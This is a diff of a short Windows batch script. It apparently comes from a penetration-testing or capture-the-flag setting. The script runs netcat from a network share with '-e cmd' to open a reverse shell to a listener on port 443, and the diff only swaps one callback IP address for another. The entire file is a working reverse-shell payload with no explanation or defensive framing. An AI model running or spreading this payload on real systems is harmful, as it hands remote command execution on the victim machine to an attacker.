@@ -1,4 +1,4 @@
 @echo off
-\\10.10.14.148\a\nc.exe -e cmd 10.10.14.148 443
+\\192.168.1.2\a\nc.exe -e cmd 192.168.1.2 443
 PAUSE
 exit
